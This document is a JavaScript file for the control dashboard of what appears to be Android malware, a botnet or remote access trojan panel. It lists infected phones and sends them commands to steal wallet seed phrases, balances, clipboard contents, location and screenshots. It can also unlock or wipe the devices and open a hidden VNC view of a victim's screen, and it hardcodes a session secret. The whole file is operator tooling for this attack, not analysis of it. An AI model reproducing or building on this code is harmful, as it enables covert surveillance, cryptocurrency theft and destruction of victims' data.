// ===== GLOBALS =====
let ws, wsConnected = false;
let hvncActive = false, hvncDeviceId = null;
let autoRefresh = true, refreshInterval = 5;
let devices = [];
let logCount = 0;

// ===== INIT =====
document.addEventListener('DOMContentLoaded', () => {
  connectWebSocket();
  loadDevices();
  setInterval(() => { if (autoRefresh) loadDevices(); }, refreshInterval * 1000);
});

// ===== WEBSOCKET =====
function connectWebSocket() {
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${proto}//${location.host}/ws`);
  
  ws.onopen = () => {
    wsConnected = true;
    document.getElementById('wsStatus').textContent = 'Connected';
    document.getElementById('wsStatus').className = 'badge green';
    addLog('WebSocket connected', 'success');
  };
  
  ws.onmessage = (e) => {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'frame' && hvncActive && msg.data) {
        const viewer = document.getElementById('hvncViewer');
        viewer.innerHTML = `<img src="data:image/png;base64,${msg.data}" style="width:100%;height:auto;max-height:70vh;object-fit:contain">`;
      }
    } catch {}
  };
  
  ws.onclose = () => {
    wsConnected = false;
    document.getElementById('wsStatus').textContent = 'Disconnected';
    document.getElementById('wsStatus').className = 'badge red';
    addLog('WebSocket disconnected, reconnecting...', 'error');
    setTimeout(connectWebSocket, 3000);
  };
  
  ws.onerror = () => {};
}

// ===== NAVIGATION =====
function navigate(view) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById(`view-${view}`).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  const navMap = { dashboard: 0, devices: 1, hvnc: 2, toolkit: 3, logs: 4, settings: 5 };
  document.querySelectorAll('.nav-item')[navMap[view] || 0]?.classList.add('active');
  document.getElementById('pageTitle').textContent = view.charAt(0).toUpperCase() + view.slice(1);
  
  if (view === 'devices') loadDevices();
  if (view === 'hvnc') populateHVNCDevices();
  if (view === 'dashboard') renderDashboard();
}

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

// ===== LOGIN =====
async function login(user, pass) {
  const r = await fetch('/api/auth', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user, pass })
  });
  return r.ok;
}

function logout() {
  document.cookie = 'token=;max-age=0';
  window.location.href = '/dashboard/login';
}

// ===== DEVICES =====
async function loadDevices() {
  try {
    const r = await fetch('/api/devices');
    const data = await r.json();
    devices = data.devices;
    
    document.getElementById('headerOnline').textContent = data.online;
    document.getElementById('headerTotal').textContent = data.total;
    document.getElementById('statOnline').textContent = data.online;
    document.getElementById('statTotal').textContent = data.total;
    document.getElementById('deviceBadge').textContent = data.total;
    
    const models = new Set(devices.map(d => d.info?.model).filter(Boolean));
    document.getElementById('statModels').textContent = models.size;
    
    const batteries = devices.filter(d => d.info?.battery).map(d => parseInt(d.info.battery));
    const avgBatt = batteries.length ? Math.round(batteries.reduce((a,b) => a+b, 0) / batteries.length) : 0;
    document.getElementById('statBattery').textContent = avgBatt + '%';
    
    renderDashboard();
    renderAllDevices();
    populateHVNCDevices();
  } catch {}
}

function renderDashboard() {
  const grid = document.getElementById('dashboardDevices');
  if (!grid) return;
  
  const recent = devices.slice(0, 8);
  grid.innerHTML = recent.map(d => deviceCardHTML(d)).join('');
}

function renderAllDevices() {
  const grid = document.getElementById('allDevices');
  if (!grid) return;
  
  grid.innerHTML = devices.map(d => deviceCardHTML(d)).join('');
}

function deviceCardHTML(d) {
  const statusClass = d.online ? 'online' : 'offline';
  return `
    <div class="device-card" onclick="selectDevice('${d.id}')">
      <div class="top">
        <span class="name">${d.info?.model || d.id.slice(0,10)}</span>
        <span class="status-dot ${statusClass}"></span>
      </div>
      <div class="details">
        <span>📱 ${d.id.slice(0,12)}...</span>
        <span>🔋 ${d.info?.battery || '?'}%</span>
        <span>🤖 ${d.info?.android || '?'}</span>
      </div>
      <div class="actions">
        <button onclick="event.stopPropagation();sendCmd('${d.id}','info')">📋 Info</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','screenshot')">📸 SS</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','location')">📍 Loc</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','clipboard')">📋 Clip</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','seed')">🌱 Seed</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','balance')">💰 Bal</button>
        <button onclick="event.stopPropagation();sendCmd('${d.id}','unlock')">🔓 Unlock</button>
        <button class="danger" onclick="event.stopPropagation();sendCmd('${d.id}','wipe')">💣 Wipe</button>
      </div>
    </div>
  `;
}

// ===== COMMANDS =====
async function sendCmd(deviceId, type, extra = {}) {
  try {
    await fetch('/api/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId, type, ...extra })
    });
    addLog(`Sent ${type} to ${deviceId.slice(0,10)}...`, 'info');
  } catch (e) {
    addLog(`Failed: ${e.message}`, 'error');
  }
}

async function selectDevice(deviceId) {
  if (confirm(`Select device ${deviceId.slice(0,12)}... for quick actions?`)) {
    navigate('devices');
  }
}

async function quickCmd(type) {
  const online = devices.filter(d => d.online);
  if (!online.length) return addLog('No online devices', 'error');
  
  const id = prompt(`Send "${type}" to device ID (first ${online[0].id.slice(0,10)}...):`, online[0].id);
  if (id) sendCmd(id, type);
}

// ===== HVNC =====
function populateHVNCDevices() {
  const sel = document.getElementById('hvncDeviceSelect');
  if (!sel) return;
  
  const online = devices.filter(d => d.online);
  sel.innerHTML = '<option value="">Select a device...</option>' +
    online.map(d => `<option value="${d.id}">${d.info?.model || '?'} (${d.id.slice(0,8)}...)</option>`).join('');
}

function startHVNC() {
  const sel = document.getElementById('hvncDeviceSelect');
  if (!sel.value) return addLog('Select a device first', 'error');
  
  hvncDeviceId = sel.value;
  hvncActive = true;
  
  // Auth to WebSocket
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'hvnc_auth', deviceId: hvncDeviceId, session: sessionSecret || 'wuzenx' }));
  }
  
  sendCmd(hvncDeviceId, 'hvnc_start');
  addLog(`HVNC started: ${hvncDeviceId.slice(0,12)}...`, 'success');
  
  setTimeout(() => sendHVNCCmd('screenshot'), 500);
  if (autoRefresh) setInterval(() => { if (hvncActive) sendHVNCCmd('screenshot'); }, 1000);
}

function stopHVNC() {
  hvncActive = false;
  hvncDeviceId = null;
  document.getElementById('hvncViewer').innerHTML = '<div class="hvnc-placeholder">HVNC stopped</div>';
  addLog('HVNC stopped', 'info');
}

function sendHVNCCmd(action) {
  if (!hvncDeviceId) return;
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'hvnc_cmd', deviceId: hvncDeviceId, action }));
  }
}

// ===== LOGS =====
function addLog(msg, type = 'info') {
  const container = document.getElementById('logsContainer');
  if (!container) return;
  
  const time = new Date().toLocaleTimeString();
  const entry = document.createElement('div');
  entry.className = `log-entry ${type}`;
  entry.textContent = `[${time}] ${msg}`;
  container.appendChild(entry);
  container.scrollTop = container.scrollHeight;
  
  // Keep max 100 logs
  while (container.children.length > 100) container.removeChild(container.firstChild);
}

// ===== SETTINGS =====
function toggleAutoRefresh() {
  autoRefresh = document.getElementById('autoRefresh').checked;
  addLog(`Auto-refresh: ${autoRefresh ? 'ON' : 'OFF'}`, 'info');
}

// ===== SESSION =====
const sessionSecret = 'wuzenx';
